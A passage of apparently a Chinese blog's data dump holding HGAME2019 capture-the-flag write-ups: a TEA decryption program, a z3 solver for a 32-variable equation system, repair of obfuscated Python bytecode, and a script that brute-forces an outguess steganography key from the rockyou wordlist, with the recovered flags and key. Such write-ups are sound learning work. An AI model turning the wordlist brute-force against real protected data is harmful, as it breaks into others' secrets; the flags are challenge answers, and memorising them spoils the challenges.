1LL) + a1); *result += (*(_DWORD *)(4LL * j + a1) + v3) ^ (16 * *(_DWORD *)(4LL * j + a1) + a2[2]) ^ ((*(_DWORD *)(4LL * j + a1) &gt;&gt; 5) + a2[3]); &#125; &#125; return result; TEA。 解密： 1234567891011121314151617181920212223242526#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;void decrypt (uint32_t* v, uint32_t* k) &#123; uint32_t v0=v[0], v1=v[1], v2=v[2],v3=v[3], sum=0xC6EF3720, i; uint32_t delta=0x9e3779b9; uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; for (i=0; i&lt;32; i++) &#123; v3 -= ((v2*16) + k2) ^ (v2 + sum) ^ ((v2&gt;&gt;5) + k3); v2 -= ((v3*16) + k0) ^ (v3 + sum) ^ ((v3&gt;&gt;5) + k1); v1 -= ((v0*16) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3); v0 -= ((v1*16) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1); sum -= delta; &#125; v[0]=v0; v[1]=v1; v[2]=v2; v[3]=v3;&#125;int main()&#123; uint32_t flag[4]=&#123;0xbdba0e28,0x38d1cd98,0x3ab63e63,0x535e9dac&#125;; uint32_t key[4]=&#123;0x5b3e0f37,0x0c3b0d3d,0x5d6e5f3a,0x31390d38&#125;; decrypt(flag,key); for (int i=0;i&lt;4;i++) &#123; printf(&quot;%x &quot;,flag[i]); &#125; return 0;&#125; 然而并没有得到正确的后半部分23333 鬼知道当时哪里搞来的flag和key…… 看了大佬的wp之后才发现自己flag和key完全不对orz 正确的flag直接从data2处取就行了。 key的话是利用6-22位异或，然而我一直不知道哪里出了错，只有第一位和和第二位是正确的。后来通过dalao的key反推发现，异或只在&quot;781ef0676e13e541&quot;上进行，但是我写脚本时却利用了异或之后的值继续异或，这也是只有一二位正确的原因。 正确flag与key： 12key[4] = &#123;0x54090f37,0x01065603, 0x02545301, 0x05015056&#125;;flag[4] =&#123;0xd240f52f,0x728cca9d,0xb6379fd3, 0xfba1a736&#125;; 改正后跑出后半部分：64313964 66656265 31633236 66363439 都是16进制，转换为字符得到：d91debef62c1946f 最终flag：hgame{781ef0676e13e541d91debef62c1946f} 简直回到了高中做数学题的时候，知道怎么做但是最后答案不对，还一直不到哪里错了orz","categories":[],"tags":[]},{"title":"outguess","slug":"outguess","date":"2019-02-10T09:53:55.000Z","updated":"2019-02-12T16:03:53.466Z","comments":true,"path":"2019/02/10/outguess/","link":"","permalink":"http://yoursite.com/2019/02/10/outguess/","excerpt":"记录一下记录一下。 HGAME2019WEEK3的misc1。","text":"记录一下记录一下。 HGAME2019WEEK3的misc1。 题目文件为一个mp4，下载下来看了一遍就GG了。 之后题目给了hint： 12hint1:DeEgger Embedderhint2:outguess 直接对着上网去搜就行了，首先使用DeEgger Embedder把视频提取一下，得到一个exe文件，查看hex发现应该是jpg文件，改好后缀后就该用outguess了。 outguess使用方法： 1outguess -k key -r xxx.jpg xxx.txt 但是这里密码是需要自己来爆破的，题目提示了是kali里的rockyou.txt里的密码，虽然我没装kali但是网上也可以找到这个文件，写个脚本把符合要求的密码全部写到另一个文件里，然后开始爆破。 12345678910import osf=open(&quot;sec.txt&quot;,&apos;rb&apos;) line=f.readline()i=1while line: command=&quot;outguess -k &quot;+line.replace(&quot;\\n&quot;,&quot;&quot;)+&quot; -r /Users/4eriri/Downloads/flag.jpg /Users/4eriri/Downloads/&quot;+str(i)+&quot;.txt&quot; os.system(command) line=f.readline() i+=1f.close() 这样每次爆破得到的文件就会以次数命名保存下来，然后按文件大小排序一下，那些几十个字节大小的txt就很有可能是正确密码爆破得到的。 最后在206.txt中发现了flag，正确的key是securitypassword。","categories":[],"tags":[]},{"title":"HGAME2019-Math简单","slug":"Math简单","date":"2019-02-08T13:18:21.000Z","updated":"2019-02-16T14:23:09.120Z","comments":true,"path":"2019/02/08/Math简单/","link":"","permalink":"http://yoursite.com/2019/02/08/Math简单/","excerpt":"…解一个三十二元一次方程组得到flag，再次练习了一下使用z3求解。","text":"…解一个三十二元一次方程组得到flag，再次练习了一下使用z3求解。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817818819820821822823824825826827828829830831832833834835836from z3 import *solver = Solver()v34 = [Int(&apos;v34%d&apos;%i) for i in range(32) ]solver.add(82 * v34[16] + 58 * v34[25] + 76 * v34[21] + 31 * v34[9] + 87 * v34[28] + 54 * v34[2] + 74 * v34[5] + 99 * v34[26] + 94 * v34[3] + 84 * v34[19] + 32 * v34[15] + 90 * v34[27] + 16 * v34[14] + 19 * v34[8] + 33 * v34[20] + 35 * v34[31] + 65 * v34[29] + 47 * v34[12] + 3 * v34[1] + 57 * v34[7] + 5 * v34[17] + 70 * v34[13] + 28 * v34[24] + 79 * v34[11] + 63 * v34[23] + 66 * v34[30] + 28 * v34[10] + v34[4] + 81 * v34[6] + 61 * v34[18] + 31 * v34[22] + 71 * v34[0] == 145397)solver.add(55 * v34[6] + 38 * v34[9] + 39 * v34[18] + 73 * v34[24] + 86 * v34[13] + 18 * v34[11] + 40 * v34[21] + 40 * v34[26] + 54 * v34[14] + 81 * v34[10] + 71 * v34[27] + 20 * v34[8] + 16 * v34[28] + 65 * v34[30] + 87 * v34[3] + 14 * v34[16] + v34[5] + 41 * v34[0] + 58 * v34[15] + 73 * v34[2] + 46 * v34[23] + 7 * v34[19] + 89 * v34[17] + 65 * v34[25] + 43 * v34[7] + 6 * v34[20] + 60 * v34[12] + 40 * v34[31] + 57 * v34[29] + 40 * v34[4] + 30 * v34[1] + 63 * v34[22] == 127517)solver.add(28 * v34[6] + 17 * v34[21] + 18 * v34[3] + 53 * v34[10] + 82 * v34[14] + 70 * v34[5] + 84 * v34[2] + 57 * v34[19] + 92 * v34[27] + 57 * v34[11] + 77 * v34[4] + 49 * v34[8] + 62 * v34[29] + 97 * v34[22] + 47 * v34[1] + 30 * v34[16] + 45 * v34[30] + 94 * v34[28] + 6 * v34[9] + 83 * v34[20] + 18 * v34[23] + 97 * v34[15] + 11 * v34[12] + 35 * v34[7] + 81 * v34[26] + 67 * v34[13] + 11 * v34[31] + 84 * v34[24] + 63 * v34[25] + 61 * v34[18] == 141411)solver.add(86 * v34[23] + 52 * v34[1] + 14 * v34[24] + 46 * v34[6] + 56 * v34[7] + 13 * v34[2] + 82 * v34[11] + 49 * v34[30] + 97 * v34[18] + 50 * v34[14] + 83 * v34[27] + 38 * v34[13] + 49 * v34[29] + 9 * v34[4] + 91 * v34[20] + 33 * v34[25] + 4 * v34[22] + 5 * v34[17] + 61 * v34[15] + 65 * v34[3] + 68 * v34[28] + 6 * v34[16] + (v34[8] * 64) + 56 * v34[9] + 67 * v34[10] + 5 * v34[5] + v34[21] + 10 * v34[19] + 83 * v34[12] + 37 * v34[26] + 85 * v34[0] == 117383)solver.add(53 * v34[3] + 91 * v34[2] + 57 * v34[25] + 66 * v34[20] + 9 * v34[28] + 63 * v34[5] + 20 * v34[4] + 96 * v34[8] + 39 * v34[11] + 91 * v34[1] + 40 * v34[9] + 85 * v34[14] + 62 * v34[16] + 95 * v34[19] + 34 * v34[22] + 67 * v34[31] + 51 * v34[27] + 45 * v34[26] + 92 * v34[15] + 91 * v34[21] + 85 * v34[13] + 12 * v34[7] + 26 * v34[23] + 56 * v34[30] + 82 * v34[18] + 72 * v34[17] + 54 * v34[6] + 17 * v34[12] + 84 * v34[29] + 17 * v34[0] + 8 * v34[24] + 63 * v34[10] == 156152)solver.add(55 * v34[23] + 88 * v34[9] + 48 * v34[4] + 83 * v34[13] + 66 * v34[7] + 60 * v34[30] + 57 * v34[6] + 85 * v34[17] + 71 * v34[28] + 98 * v34[24] + 83 * v34[10] + 12 * v34[1] + 72 * v34[31] + 12 * v34[22] + 80 * v34[20] + 15 * v34[19] + 81 * v34[21] + 87 * v34[0] + 37 * v34[16] + 4 * v34[15] + 41 * v34[3] + 84 * v34[26] + 56 * v34[25] + 84 * v34[14] + 41 * v34[27] + 98 * v34[18] + 18 * v34[2] + 95 * v34[11] + 33 * v34[29] + 66 * v34[8] == 148963)solver.add(43 * v34[16] + 47 * v34[0] + 53 * v34[24] + 75 * v34[11] + 57 * v34[21] + 63 * v34[12] + 4 * v34[14] + 59 * v34[31] + 15 * v34[23] + 12 * v34[25] + 58 * v34[5] + 40 * v34[4] + 26 * v34[30] + 8 * v34[15] + 25 * v34[6] + 97 * v34[10] + 12 * v34[28] + 74 * v34[26] + 65 * v34[8] + 93 * v34[27] + 18 * v34[22] + 84 * v34[2] + 7 * v34[1] + 22 * v34[18] + 9 * v34[17] + 89 * v34[19] + 72 * v34[13] + 47 * v34[20] + 7 * v34[29] + 8 * v34[9] + 24 * v34[7] + 75 * v34[3] == 121517)solver.add(77 * v34[30] + 89 * v34[31] + 55 * v34[7] + 86 * v34[17] + 74 * v34[0] + 72 * v34[4] + 27 * v34[20] + 88 * v34[9] + (v34[21] * 64) + 52 * v34[15] + 4 * v34[19] + 8 * v34[1] + 16 * v34[13] + 54 * v34[25] + 8 * v34[29] + 52 * v34[23] + 14 * v34[10] + 88 * v34[18] + 33 * v34[8] + 99 * v34[27] + 65 * v34[14] + 66 * v34[5] + 36 * v34[6] + 58 * v34[16] + 63 * v34[22] + 93 * v34[3] + 96 * v34[11] + 26 * v34[26] + 65 * v34[12] + 42 * v34[28] + 14 * v34[2] + 57 * v34[24] == 151446)solver.add(53 * v34[24] + 95 * v34[27] + 51 * v34[7] + 42 * v34[4] + 78 * v34[8] + 45 * v34[25] + 63 * v34[30] + 85 * v34[26] + 30 * v34[29] + 83 * v34[14] + 62 * v34[31] + 71 * v34[22] + 45 * v34[17] + (v34[6] *64 ) + 87 * v34[23] + 49 * v34[28] + 14 * v34[0] + 4 * v34[21] + 63 * v34[5] + 53 * v34[13] + 19 * v34[19] + 44 * v34[16] + 5 * v34[3] + 74 * v34[15] + 19 * v34[18] + 89 * v34[11] + 11 * v34[20] + 34 * v34[12] + 14 * v34[1] + 87 * v34[10] + 63 * v34[9] + 70 * v34[2] == 142830)solver.add(69 * v34[0] + 67 * v34[9] + 57 * v34[15] + 77 * v34[10] + 67 * v34[26] + 94 * v34[11] + 13 * v34[29] + 11 * v34[22] + 41 * v34[5] + 38 * v34[13] + 90 * v34[31] + 68 * v34[7] + 56 * v34[14] + 4 * v34[23] + 66 * v34[28] + 28 * v34[1] + 6 * v34[12] + 91 * v34[16] + 59 * v34[3] + 81 * v34[17] + 44 * v34[2] + 33 * v34[24] + 34 * v34[19] + 17 * v34[18] + 77 * v34[25] + 25 * v34[8] + 8 * v34[6] + 10 * v34[30] + 66 * v34[20] + 41 * v34[27] + 29 * v34[21] == 122585)solver.add(31 * v34[9] + 17 * v34[4] + 6 * v34[28] + 23 * v34[25] + 32 * v34[3] + 72 * v34[15] + 41 * v34[26] + 33 * v34[30] + 82 * v34[13] + 20 * v34[0] + 7 * v34[12] + 25 * v34[29] + 39 * v34[21] + 57 * v34[14] + 14 * v34[16] + 24 * v34[24] + 37 * v34[22] + 71 * v34[10] + 65 * v34[23] + 46 * v34[8] + 40 * v34[19] + 77 * v34[27] + 80 * v34[18] + 88 * v34[6] + 20 * v34[31] + 83 * v34[11] + 73 * v34[1] + 8 * v34[5] + 15 * v34[20] + 70 * v34[7] + 24 * v34[17] + 16 * v34[2] == 105293)solver.add(25 * v34[21] + 79 * v34[3] + 41 * v34[24] + 45 * v34[30] + 82 * v34[20] + 86 * v34[19] + 99 * v34[9] + 96 * v34[22] + 85 * v34[28] + 70 * v34[5] + 77 * v34[23] + 80 * v34[11] + 40 * v34[31] + 66 * v34[12] + 12 * v34[2] + 77 * v34[15] + 72 * v34[4] + 42 * v34[26] + 81 * v34[27] + 90 * v34[13] + 37 * v34[16] + 29 * v34[17] + 20 * v34[29] + 85 * v34[6] + 6 * v34[7] + 2 * v34[0] + 72 * v34[1] + 75 * v34[14] + 40 * v34[25] + 29 * v34[8] + 25 * v34[10] == 151962)solver.add(83 * v34[11] + 75 * v34[1] + 42 * v34[31] + 95 * v34[30] + 58 * v34[8] + 47 * v34[13] + 65 * v34[15] + 24 * v34[17] + 97 * v34[10] + 24 * v34[21] + 28 * v34[0] + 77 * v34[5] + 97 * v34[6] + 24 * v34[26] + 32 * v34[12] + 5 * v34[25] + 55 * v34[28] + 9 * v34[23] + 85 * v34[4] + 6 * v34[9] + 61 * v34[19] + 12 * v34[3] + 76 * v34[7] + 36 * v34[27] + 77 * v34[24] + 24 * v34[29] + 67 * v34[14] + 19 * v34[16] + 47 * v34[20] + 13 * v34[22] == 125609)solver.add(30 * v34[25] + 41 * v34[28] + 65 * v34[10] + v34[1] + 88 * v34[3] + 90 * v34[0] + 4 * v34[23] + 46 * v34[7] + 54 * v34[16] + 16 * v34[6] + 89 * v34[22] + 76 * v34[27] + 38 * v34[17] + 3 * v34[5] + 70 * v34[14] + 3 * v34[24] + 24 * v34[13] + 54 * v34[2] + 20 * v34[8] + 83 * v34[12] + 21 * v34[15] + 77 * v34[18] + 31 * v34[19] + 59 * v34[21] + 33 * v34[20] + 84 * v34[11] + 19 * v34[29] + 38 * v34[26] + 63 * v34[31] + 16 * v34[30] + 15 * v34[4] + 39 * v34[9] == 123069)solver.add(6 * v34[9] + 19 * v34[19] + 27 * v34[18] + 48 * v34[4] + 13 * v34[20] + 44 * v34[10] + 70 * v34[12] + 44 * v34[17] + 22 * v34[23] + 55 * v34[14] + 73 * v34[26] + 55 * v34[8] + 58 * v34[11] + 31 * v34[30] + 78 * v34[29] + 19 * v34[25] + 52 * v34[31] + 27 * v34[21] + 38 * v34[27] + 40 * v34[28] + 35 * v34[1] + 48 * v34[22] + 71 * v34[15] + 24 * v34[6] + 89 * v34[16] + 37 * v34[3] + 78 * v34[2] + 3 * v34[5] + 52 * v34[24] + 40 * v34[7] == 113842)solver.add(95 * v34[8] + 92 * v34[18] + 84 * v34[31] + 31 * v34[12] + 35 * v34[10] + 54 * v34[20] + 26 * v34[29] + 29 * v34[3] + 2 * v34[23] + 46 * v34[0] + 30 * v34[26] + 56 * v34[27] + 100 * v34[11] + 43 * v34[1] + 15 * v34[4] + 79 * v34[17] + 12 * v34[5] + 38 * v34[9] + 3 * v34[30] + 16 * v34[21] + 19 * v34[13] + 67 * v34[19] + 37 * v34[28] + v34[7] + 73 * v34[16] + 85 * v34[6] + 17 * v34[14] + 90 * v34[22] + 15 * v34[2] + 43 * v34[25] + 96 * v34[24] == 119824)solver.add(36 * v34[22] + 69 * v34[28] + 77 * v34[6] + 92 * v34[20] + 43 * v34[23] + 16 * v34[19] + 92 * v34[5] + 49 * v34[26] + 44 * v34[2] + 26 * v34[29] + (v34[25] * 64) + 45 * v34[24] + 99 * v34[11] + 43 * v34[4] + 75 * v34[21] + 53 * v34[31] + 18 * v34[18] + 11 * v34[13] + 52 * v34[0] + 16 * v34[8] + 9 * v34[7] + 77 * v34[16] + 33 * v34[10] + 86 * v34[1] + 33 * v34[3] + 29 * v34[9] + 6 * v34[12] + 91 * v34[14] + 36 * v34[15] + 94 * v34[27] + 13 * v34[30] + 89 * v34[17] == 135873)solver.add(16 * v34[7] + v34[15] + 82 * v34[9] + 60 * v34[29] + 68 * v34[2] + 83 * v34[10] + 47 * v34[5] + 85 * v34[13] + 22 * v34[8] + 92 * v34[27] + 75 * v34[28] + 43 * v34[3] + 29 * v34[22] + 92 * v34[0] + 54 * v34[16] + 17 * v34[30] + 78 * v34[18] + 7 * v34[23] + 69 * v34[21] + 63 * v34[31] + 71 * v34[4] + 10 * v34[6] + 66 * v34[14] + 25 * v34[26] + 32 * v34[1] + 48 * v34[19] + 86 * v34[11] + 20 * v34[25] + 78 * v34[20] + 25 * v34[17] + 76 * v34[12] + 13 * v34[24] == 142509)solver.add(88 * v34[22] + 23 * v34[13] + 18 * v34[14] + 77 * v34[9] + 56 * v34[30] + 79 * v34[2] + 71 * v34[29] + 95 * v34[28] + 87 * v34[24] + 62 * v34[16] + 85 * v34[26] + 43 * v34[20] + 67 * v34[15] + 97 * v34[8] + 80 * v34[0] + 23 * v34[3] + 95 * v34[25] + 82 * v34[21] + 66 * v34[31] + 5 * v34[4] + 66 * v34[27] + 25 * v34[12] + 4 * v34[5] + 12 * v34[7] + 85 * v34[1] + 10 * v34[6] + 45 * v34[11] + 28 * v34[18] + 26 * v34[19] + 48 * v34[23] + 45 * v34[17] == 148888)solver.add(25 * v34[8] + 81 * v34[30] + 21 * v34[6] + 72 * v34[11] + 48 * v34[18] + 2 * v34[19] + 42 * v34[10] + 22 * v34[24] + 99 * v34[2] + 78 * v34[22] + 83 * v34[12] + 60 * v34[9] + 59 * v34[13] + 15 * v34[5] + 25 * v34[20] + 43 * v34[15] + 56 * v34[28] + 33 * v34[25] + 71 * v34[23] + 31 * v34[0] + 95 * v34[3] + 73 * v34[17] + 86 * v34[14] + 15 * v34[21] + 61 * v34[7] + 12 * v34[29] + 95 * v34[26] + 13 * v34[1] + 100 * v34[16] + 11 * v34[4] + 79 * v34[27] == 138023)solver.add(37 * v34[28] + 62 * v34[25] + 42 * v34[18] + 53 * v34[27] + 52 * v34[29] + 70 * v34[22] + 35 * v34[30] + 50 * v34[16] + 59 * v34[8] + 75 * v34[10] + 55 * v34[20] + 23 * v34[0] + 52 * v34[17] + 47 * v34[3] + 91 * v34[13] + 46 * v34[7] + 42 * v34[14] + 79 * v34[26] + 87 * v34[21] + 30 * v34[6] + 26 * v34[1] + 57 * v34[31] + 33 * v34[12] + 51 * v34[9] + 56 * v34[24] + 59 * v34[11] + 36 * v34[23] + 88 * v34[4] + 28 * v34[2] + 44 * v34[15] + 19 * v34[19] + 74 * v34[5] == 142299)solver.add( 80 * v34[21] + 43 * v34[31] + 67 * v34[16] + 55 * v34[13] + 95 * v34[24] + 46 * v34[28] + 93 * v34[5] + 75 * v34[20] + 14 * v34[25] + 24 * v34[26] + 50 * v34[29] + 70 * v34[15] + 63 * v34[30] + 77 * v34[23] + 96 * v34[19] + 66 * v34[11] + 72 * v34[27] + 94 * v34[4] + 63 * v34[22] + 69 * v34[3] + 73 * v34[1] + 60 * v34[7] + 9 * v34[2] + 39 * v34[17] + 25 * v34[0] + 49 * v34[14] + 48 * v34[8] + 86 * v34[9] + 72 * v34[10] + 23 * v34[18] + 21 * v34[6] == 155777)solver.add(25 * v34[24] + 11 * v34[22] + 27 * v34[11] + 40 * v34[8] + 53 * v34[15] + 40 * v34[18] + 56 * v34[3] + 2 * v34[2] + 32 * v34[4] + 90 * v34[1] + 54 * v34[16] + 20 * v34[9] + 86 * v34[17] + 82 * v34[31] + 43 * v34[25] + 43 * v34[13] + 86 * v34[21] + 17 * v34[0] + (v34[14] * 64) + 6 * v34[30] + 86 * v34[5] + 15 * v34[7] + 46 * v34[12] + 21 * v34[26] + 90 * v34[20] + 19 * v34[6] + 93 * v34[23] + 31 * v34[27] + 62 * v34[29] + 21 * v34[19] + 42 * v34[10] == 117687)solver.add(89 * v34[21] + 100 * v34[13] + v34[27] + 66 * v34[18] + 40 * v34[17] + 17 * v34[0] + 27 * v34[19] + 26 * v34[31] + 57 * v34[24] + 35 * v34[3] + 80 * v34[1] + 67 * v34[5] + 85 * v34[6] + 7 * v34[15] + 93 * v34[8] + 3 * v34[22] + 77 * v34[12] + 12 * v34[28] + 4 * v34[2] + 27 * v34[9] + 53 * v34[25] + 37 * v34[30] + 43 * v34[23] + 33 * v34[4] + 39 * v34[26] + 7 * v34[7] + 75 * v34[10] + 15 * v34[14] + 45 * v34[20] + 36 * v34[29] + 78 * v34[11] + 31 * v34[16] == 117383)solver.add(73 * v34[20] + 16 * v34[26] + 100 * v34[5] + 71 * v34[28] + 71 * v34[16] + 4 * v34[1] + 77 * v34[31] + 83 * v34[2] + 11 * v34[30] + 53 * v34[19] + 85 * v34[12] + 67 * v34[13] + 39 * v34[8] + 45 * v34[24] + 84 * v34[22] + 99 * v34[14] + 38 * v34[3] + 29 * v34[4] + 90 * v34[9] + 61 * v34[18] + 40 * v34[7] + (v34[17] * 64) + 9 * v34[25] + 86 * v34[29] + 80 * v34[21] + 4 * v34[15] + 96 * v34[23] + 99 * v34[10] + 40 * v34[27] + 4 * v34[0] + 56 * v34[11] == 155741)solver.add((v34[12] * 64) + 76 * v34[0] + 5 * v34[11] + 87 * v34[2] + 86 * v34[24] + 76 * v34[14] + 38 * v34[23] + 85 * v34[3] + 71 * v34[22] + 42 * v34[29] + 85 * v34[30] + 14 * v34[10] + 17 * v34[13] + 42 * v34[25] + 11 * v34[19] + 44 * v34[15] + 21 * v34[4] + 60 * v34[16] + 28 * v34[6] + 46 * v34[20] + 25 * v34[9] + 77 * v34[31] + 21 * v34[8] + 85 * v34[7] + 36 * v34[1] + 91 * v34[27] + 21 * v34[28] + 38 * v34[17] + 3 * v34[26] + 61 * v34[21] + 15 * v34[5] + 32 * v34[18] == 132804)solver.add(95 * v34[30] + 75 * v34[28] + 3 * v34[10] + 36 * v34[1] + 60 * v34[3] + 84 * v34[11] + 19 * v34[26] + 76 * v34[27] + 86 * v34[16] + 92 * v34[8] + 96 * v34[14] + 60 * v34[21] + 23 * v34[4] + 60 * v34[12] + 50 * v34[23] + 78 * v34[22] + 45 * v34[9] + 42 * v34[18] + 10 * v34[2] + 60 * v34[20] + 24 * v34[24] + 77 * v34[7] + 41 * v34[6] + 29 * v34[13] + 33 * v34[5] + 2 * v34[15] + 33 * v34[29] + 39 * v34[31] + 41 * v34[25] + 100 * v34[19] + 9 * v34[17] + 79 * v34[0] == 145568)solver.add(68 * v34[5] + 98 * v34[27] + 98 * v34[16] + 10 * v34[19] + 25 * v34[26] + 98 * v34[24] + 15 * v34[6] + 50 * v34[18] + 88 * v34[20] + 74 * v34[11] + 83 * v34[1] + 86 * v34[21] + 52 * v34[7] + 39 * v34[10] + 40 * v34[13] + 82 * v34[28] + 37 * v34[3] + 45 * v34[0] + 18 * v34[25] + 2 * v34[29] + 6 * v34[12] + 78 * v34[31] + 37 * v34[2] + 57 * v34[23] + 3 * v34[4] + 59 * v34[8] + 73 * v34[15] + v34[22] + 18 * v34[9] + 35 * v34[14] + 20 * v34[17] + 54 * v34[30] == 130175)solver.add(60 * v34[10] + 50 * v34[12] + 30 * v34[29] + 90 * v34[19] + 68 * v34[23] + 60 * v34[18] + 93 * v34[20] + 100 * v34[11] + 98 * v34[14] + 32 * v34[3] + 15 * v34[21] + 79 * v34[0] + 6 * v34[24] + 62 * v34[26] + 96 * v34[6] + 68 * v34[22] + 9 * v34[7] + 88 * v34[5] + 18 * v34[27] + 70 * v34[9] + 96 * v34[25] + 89 * v34[4] + 14 * v34[31] + 83 * v34[17] + 19 * v34[15] + 44 * v34[1] + 96 * v34[8] + 87 * v34[16] + 48 * v34[2] + 95 * v34[13] + 73 * v34[28] + 92 * v34[30] == 171986)solver.add(53 * v34[30] + 87 * v34[25] + 23 * v34[29] + 80 * v34[20] + 86 * v34[9] + 20 * v34[7] + 29 * v34[16] + 31 * v34[14] + 83 * v34[26] + 11 * v34[4] + 29 * v34[19] + 82 * v34[13] + 84 * v34[10] + 70 * v34[1] + 52 * v34[12] + 40 * v34[6] + 91 * v34[8] + 6 * v34[17] + 77 * v34[28] + 56 * v34[5] + 86 * v34[23] + 63 * v34[31] + 26 * v34[27] + 19 * v34[22] + 50 * v34[3] + 15 * v34[15] + 67 * v34[2] + 37 * v34[24] + 84 * v34[18] + 81 * v34[21] + 93 * v34[0] == 151676)solver.add(29 * v34[3] + 93 * v34[5] + 67 * v34[21] + 12 * v34[11] + 82 * v34[24] + 100 * v34[8] + 29 * v34[26] + 97 * v34[12] + 32 * v34[6] + 26 * v34[27] + 46 * v34[19] + 8 * (v34[25] + 9 * v34[0] + 2 * v34[17]) + 63 * v34[10] + 39 * v34[29] + 81 * v34[15] + 51 * v34[13] + 31 * v34[30] + 49 * v34[4] + 3 * v34[22] + 26 * v34[28] + 15 * v34[20] + 89 * v34[2] + 5 * v34[31] + 47 * v34[18] + 19 * v34[23] + 98 * v34[9] + 15 * v34[16] + 49 * v34[1] == 128223)solver.add(13 * v34[14] + 73 * v34[19] + 99 * v34[7] + 76 * v34[12] + 84 * v34[25] + 91 * v34[10] + 67 * v34[22] + 77 * v34[15] + 23 * v34[26] + 38 * v34[4] + 3 * v34[31] + 76 * v34[13] + 50 * v34[0] + 74 * v34[11] + 45 * v34[28] + 58 * v34[29] + 39 * v34[5] + 95 * v34[9] + 26 * v34[16] + 23 * v34[8] + 28 * v34[24] + 89 * v34[1] + 88 * v34[18] + 3 * v34[3] + 59 * v34[20] + 80 * v34[23] + 49 * v34[17] + 56 * v34[21] + 32 * v34[27] + 24 * v34[2] + 77 * v34[30] + 18 * v34[6] == 138403)if solver.check() == sat: m = solver.model() s=[] for i in range(32): s.append(m[v34[i]].as_long())print &apos;&apos;.join([chr(i) for i in s]) 没带鼠标回家拖数据好累s","categories":[],"tags":[]},{"title":"HGAME2019-python-bytecode","slug":"HGAME2019-python-bytecode","date":"2019-02-06T09:32:22.000Z","updated":"2019-02-20T15:14:53.205Z","comments":true,"path":"2019/02/06/HGAME2019-python-bytecode/","link":"","permalink":"http://yoursite.com/2019/02/06/HGAME2019-python-bytecode/","excerpt":"题目给了一个pyc文件，但是不能用uncompyle2反编译成py文件。很难受，给了hint：bytecode。网上🏄发现了python自带的dis模块，可以解析一下pyc文件。","text":"题目给了一个pyc文件，但是不能用uncompyle2反编译成py文件。很难受，给了hint：bytecode。网上🏄发现了python自带的dis模块，可以解析一下pyc文件。 1234567import disimport marshalf=open(&quot;1.pyc&quot;,&apos;rb&apos;)magic=f.read(4)mtime=f.read(4)code=marshal.load(f)dis.dis(code) 然而什么都不做直接使用dis会出现： 123456789101112131415 2 0 JUMP_ABSOLUTE 3 &gt;&gt; 3 JUMP_ABSOLUTE 9 6 LOAD_CONST 15 (&quot;You&apos;re Wrong! &quot;) &gt;&gt; 9 JUMP_ABSOLUTE 14 3 12 PRINT_ITEM 13 LOAD_CONST 100Traceback (most recent call last): File &quot;2.py&quot;, line 6, in &lt;module&gt; dis.dis(code) File &quot;/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/dis.py&quot;, line 43, in dis disassemble(x) File &quot;/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/dis.py&quot;, line 95, in disassemble print &apos;(&apos; + repr(co.co_consts[oparg]) + &apos;)&apos;,IndexError: tuple index out of range 继续网上🏄，了解到结合上下文修改出错的地方的字节码就OK了。没有头绪地弄了半天，最终改掉了LOAD_CONST 100中的100，十六进制表示为0x64，改成00就可以先凑合看着了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128 2 0 JUMP_ABSOLUTE 3 &gt;&gt; 3 JUMP_ABSOLUTE 9 6 LOAD_CONST 15 (&quot;You&apos;re Wrong! &quot;) &gt;&gt; 9 JUMP_ABSOLUTE 14 3 12 PRINT_ITEM 13 PRINT_NEWLINE &gt;&gt; 14 LOAD_CONST 0 (-1) 17 LOAD_CONST 1 (None) 20 IMPORT_NAME 0 (string) 23 STORE_NAME 0 (string) 26 LOAD_NAME 1 (list) 29 LOAD_NAME 0 (string) 32 LOAD_ATTR 2 (letters) 35 CALL_FUNCTION 1 38 LOAD_NAME 1 (list) 41 LOAD_NAME 0 (string) 44 LOAD_ATTR 3 (digits) 47 CALL_FUNCTION 1 5 50 BINARY_ADD 51 LOAD_CONST 2 (&apos;+&apos;) 54 LOAD_CONST 3 (&apos;/&apos;) 57 BUILD_LIST 2 60 BINARY_ADD 61 STORE_NAME 2 (letters) 64 LOAD_CONST 4 (&apos;FcjTCgD1EffEm2rPC3bTyL5Wu2bKBI9KAZrwFgrUygHN&apos;) 67 STORE_NAME 4 (dec)35 70 LOAD_CONST 5 (&lt;code object encode at 0x101a328b0, file &quot;third.py&quot;, line 7&gt;) 73 MAKE_FUNCTION 0 76 STORE_NAME 5 (encode) 79 LOAD_CONST 6 (&quot;Welcome to Processor&apos;s Python Classroom Part 3&amp;4!\\n&quot;) 82 PRINT_ITEM 83 PRINT_NEWLINE 84 LOAD_CONST 7 (&apos;qi shi wo jiu shi lan cai ba liang dao ti fang zai yi qi.&apos;) 87 